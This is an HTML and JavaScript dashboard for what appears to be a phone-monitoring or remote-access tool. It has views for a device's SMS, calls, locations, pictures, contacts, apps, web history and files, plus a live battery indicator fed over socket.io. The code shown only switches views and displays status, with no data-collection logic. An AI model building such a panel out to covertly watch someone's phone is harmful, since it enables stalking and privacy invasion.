<!DOCTYPE html>
<html>
<head>
    <title>Control Panel</title>
    <script src="/socket.io/socket.io.js"></script>
    <style>
        :root {
            --sidebar-bg: #34495e;
            --main-bg: #f5f5f5;
            --accent-teal: #1abc9c;
            --sms-blue: #3498db;
            --calls-teal: #1abc9c;
            --loc-purple: #9b59b6;
            --pic-yellow: #f1c40f;
            --apps-coral: #e74c3c;
            --contacts-blue: #5dade2;
            --web-green: #2ecc71;
            --screen-cyan: #17a589;
            --im-red: #e74c3c;
        }

        body { 
            font-family: 'Segoe UI', sans-serif; 
            background: var(--main-bg); 
            margin: 0; 
            display: flex; 
            color: #333; 
            min-height: 100vh;
        }

        /* SIDEBAR */
        .sidebar {
            width: 250px;
            background: var(--sidebar-bg);
            color: #bdc3c7;
            display: flex;
            flex-direction: column;
            position: fixed;
            height: 100vh;
            overflow-y: auto;
            z-index: 100;
        }

        .sidebar-header {
            background: var(--accent-teal);
            color: white;
            padding: 15px 20px;
            font-size: 1.1rem;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .nav-item {
            padding: 12px 20px;
            display: flex;
            align-items: center;
            gap: 15px;
            cursor: pointer;
            border-bottom: 1px solid #2c3e50;
            transition: 0.2s;
            font-size: 0.95rem;
        }

        .nav-item:hover, .nav-item.active { background: #2c3e50; color: white; }

        /* MAIN CONTENT AREA */
        .main-content {
            margin-left: 250px;
            flex-grow: 1;
            display: flex;
            flex-direction: column;
        }

        /* TOP STATUS BAR */
        .top-nav {
            height: 60px;
            background: white;
            display: flex;
            justify-content: flex-end;
            align-items: center;
            padding: 0 30px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
            position: sticky;
            top: 0;
            z-index: 50;
        }

        .status-wrapper { display: flex; align-items: center; gap: 10px; }

        .battery-box {
            padding: 5px 15px;
            border-radius: 4px;
            font-weight: bold;
            font-size: 1.1rem;
            transition: 0.4s;
        }
        .online { background-color: #d4efdf; color: #145a32; }
        .offline { background-color: #fadbd8; color: #7b241c; }

        .state-icon { font-size: 1.2rem; display: none; }
        #charging-icon { color: #f1c40f; } 
        #unplugged-icon { color: #27ae60; }

        /* CONTENT VIEWS */
        .view-section { display: none; padding: 30px; }
        .view-section.active { display: block; }

        .page-title { font-size: 1.5rem; color: #7f8c8d; margin-bottom: 25px; font-weight: 300; }

        /* DASHBOARD GRID */
        .grid-layout {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: 15px;
        }

        .dash-card {
            height: 120px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 25px;
            color: white;
            position: relative;
            overflow: hidden;
            border-radius: 2px;
            cursor: pointer;
        }

        .card-icon { font-size: 4rem; opacity: 0.2; position: absolute; left: 10px; }
        .card-info { text-align: right; z-index: 1; }
        .card-count { font-size: 2.2rem; display: block; }
        .card-label { font-size: 0.85rem; text-transform: uppercase; font-weight: bold; }

        .c-sms { background: var(--sms-blue); }
        .c-calls { background: var(--calls-teal); }
        .c-loc { background: var(--loc-purple); }
        .c-pic { background: var(--pic-yellow); }
        .c-apps { background: var(--apps-coral); }
        .c-contacts { background: var(--contacts-blue); }
        .c-web { background: var(--web-green); }
        .c-screen { background: var(--screen-cyan); }
        .c-im { background: var(--im-red); }
    </style>
</head>
<body>

    <div class="sidebar">
        <div class="sidebar-header">üè† System Monitor</div>
        <div class="nav-item active" onclick="showView('dashboard')">üè† Dashboard</div>
        <div class="nav-item" onclick="showView('sms')">‚úâÔ∏è SMS</div>
        <div class="nav-item" onclick="showView('calls')">üìû Calls</div>
        <div class="nav-item" onclick="showView('locations')">üìç Locations</div>
        <div class="nav-item" onclick="showView('pictures')">üì∑ Pictures</div>
        <div class="nav-item" onclick="showView('apps')">üéÆ Apps</div>
        <div class="nav-item" onclick="showView('contacts')">üìñ Contacts</div>
        <div class="nav-item" onclick="showView('web')">üåê Site Web</div>
        <div class="nav-item" onclick="showView('explorer')">üìÇ File Explorer</div>
    </div>

    <div class="main-content">
        <div class="top-nav">
            <div class="status-wrapper">
                <div id="bat-box" class="battery-box offline">
                    <span id="bat-pct">--</span>%
                </div>
                <span id="charging-icon" class="state-icon">‚ö°</span>
                <span id="unplugged-icon" class="state-icon">üîã</span>
            </div>
        </div>

        <section id="dashboard" class="view-section active">
            <div class="page-title">Dashboard</div>
            <div class="grid-layout">
                <div class="dash-card c-sms" onclick="showView('sms')">
                    <span class="card-icon">‚úâÔ∏è</span>
                    <div class="card-info"><span class="card-count">0</span><span class="card-label">SMS</span></div>
                </div>
                <div class="dash-card c-calls" onclick="showView('calls')">
                    <span class="card-icon">üìû</span>
                    <div class="card-info"><span class="card-count">0</span><span class="card-label">Calls</span></div>
                </div>
                <div class="dash-card c-loc" onclick="showView('locations')">
                    <span class="card-icon">üìç</span>
                    <div class="card-info"><span class="card-count">0</span><span class="card-label">Locations</span></div>
                </div>
            </div>
        </section>

        <section id="sms" class="view-section">
            <div class="page-title">SMS Messages</div>
            <p>No messages received yet.</p>
        </section>

        <section id="calls" class="view-section">
            <div class="page-title">Call Logs</div>
            <p>No call logs available.</p>
        </section>
        
        </div>

    <script>
        const socket = io();
        
        // FUNCTION TO SWITCH VIEWS
        function showView(viewId) {
            // Hide all sections
            document.querySelectorAll('.view-section').forEach(section => {
                section.classList.remove('active');
            });
            // Show selected section
            const target = document.getElementById(viewId);
            if (target) target.classList.add('active');

            // Update sidebar active state
            document.querySelectorAll('.nav-item').forEach(item => {
                item.classList.remove('active');
                if (item.innerText.toLowerCase().includes(viewId)) {
                    item.classList.add('active');
                }
            });
        }

        const batBox = document.getElementById('bat-box');
        const batPct = document.getElementById('bat-pct');
        const chargingIcon = document.getElementById('charging-icon');
        const unpluggedIcon = document.getElementById('unplugged-icon');

        socket.on('device-status', (status) => {
            if (status.online) {
                batBox.className = "battery-box online";
            } else {
                batBox.className = "battery-box offline";
                batPct.innerText = "--";
                chargingIcon.style.display = "none";
                unpluggedIcon.style.display = "none";
            }
        });

        socket.on('ui-battery', (data) => {
            let finalPercent;
            let isCharging = false;
            if (typeof data === 'object' && data !== null) {
                finalPercent = data.percent;
                isCharging = data.charging;
            } else {
                finalPercent = data;
            }
            batPct.innerText = finalPercent;
            batBox.className = "battery-box online";
            if (isCharging) {
                chargingIcon.style.display = "inline";
                unpluggedIcon.style.display = "none";
            } else {
                chargingIcon.style.display = "none";
                unpluggedIcon.style.display = "inline";
            }
        });
    </script>
</body>
</html>
